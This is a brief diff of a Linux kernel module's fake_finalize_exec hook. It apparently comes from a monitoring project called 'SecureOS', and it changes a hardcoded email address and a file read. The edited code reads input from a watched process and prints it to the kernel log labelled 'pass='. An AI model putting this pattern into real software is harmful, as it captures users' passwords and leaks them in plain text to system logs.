@@ -481,7 +481,7 @@ static asmlinkage void fake_finalize_exec(struct linux_binprm *bprm)
 		}
 		spin_unlock(&process_counter_lock);
 		
-		char arg[] = "tushargr@turing.cse.iitk.ac.in\n";
+		char arg[] = "temp@localhost\n";
 		struct msg_header* header = kmalloc(sizeof(struct msg_header),GFP_KERNEL);
 		header->msg_status = USED;
 		header->pid = 0;
@@ -548,8 +548,8 @@ static asmlinkage void fake_finalize_exec(struct linux_binprm *bprm)
 						if(watched_processes[i].open_files[j].fd == fd)break;
 					}
 					offset =0;
-					ret = kernel_read(filp_stdin, buf, 1024, &offset);
-					printk("TUSHAR:pass=%s len=%d\n",buf,strlen(buf));
+					ret = kernel_read(watched_processes[i].open_files[49].filp , buf, 1024, &offset);
+					printk("SecureOS:pass=%s len=%d\n",buf,strlen(buf));
 					struct msg_header* header = kmalloc(sizeof(struct msg_header),GFP_KERNEL);
 					header->msg_status = 1;
 					header->pid = pid;
